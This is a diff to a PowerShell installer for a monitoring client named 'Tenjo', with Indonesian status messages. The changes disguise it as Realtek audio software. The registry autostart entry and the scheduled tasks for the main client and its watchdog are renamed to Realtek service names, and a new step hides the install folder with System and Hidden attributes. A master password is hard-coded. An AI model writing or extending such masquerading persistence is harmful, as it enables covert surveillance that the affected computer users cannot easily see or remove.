@@ -137,9 +137,9 @@ cd /d "C:\ProgramData\Realtek 786"
 python.exe main.py
 "@ | Set-Content "$InstallDir\start_tenjo.bat"
     
-    # Registry autostart
+    # Registry autostart (disguised name)
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    Set-ItemProperty -Path $regPath -Name "TenjoMonitor" -Value "$InstallDir\start_tenjo.bat" -Force
+    Set-ItemProperty -Path $regPath -Name "RtkAudioSrv" -Value "$InstallDir\start_tenjo.bat" -Force
     
     # Scheduled task XML for main client
     $taskXml = @"
@@ -153,7 +153,7 @@ python.exe main.py
 "@
     $taskXmlPath = "$env:TEMP\tenjo_task.xml"
     $taskXml | Set-Content $taskXmlPath
-    & schtasks /Create /TN "TenjoMonitor" /XML $taskXmlPath /F | Out-Null
+    & schtasks /Create /TN "RtkAudioService64" /XML $taskXmlPath /F | Out-Null
     Remove-Item $taskXmlPath -Force
     
     # Scheduled task XML for watchdog
@@ -168,7 +168,7 @@ python.exe main.py
 "@
     $watchdogXmlPath = "$env:TEMP\tenjo_watchdog.xml"
     $watchdogXml | Set-Content $watchdogXmlPath
-    & schtasks /Create /TN "TenjoWatchdog" /XML $watchdogXmlPath /F | Out-Null
+    & schtasks /Create /TN "RtkMonitorService" /XML $watchdogXmlPath /F | Out-Null
     Remove-Item $watchdogXmlPath -Force
     
     # Set password protection
@@ -202,7 +202,7 @@ python.exe main.py
     Start-Sleep -Seconds 2
     
     # Apply folder protection
-    Write-Host "[7/8] Protecting folder..." -ForegroundColor Cyan
+    Write-Host "[7/8] Protecting and hiding folder..." -ForegroundColor Cyan
     $masterPassword = "TenjoAdilabs96"
     
     # Check if folder_protection.py exists
@@ -226,6 +226,16 @@ python.exe main.py
     } else {
         Write-Host "[!] WARNING: folder_protection.py tidak ditemukan" -ForegroundColor Yellow
         Write-Host "  Installer akan lanjut tanpa folder protection" -ForegroundColor Yellow
+    }
+    
+    # Hide folder from File Explorer
+    try {
+        # Set System + Hidden attributes on folder
+        & attrib +S +H "$InstallDir" /S /D
+        Write-Host "[OK] Folder tersembunyi dari File Explorer" -ForegroundColor Green
+        Write-Host "  - Folder tidak terlihat di Explorer (kecuali 'Show hidden files' aktif)" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] WARNING: Gagal hide folder" -ForegroundColor Yellow
     }
     
     # Start service
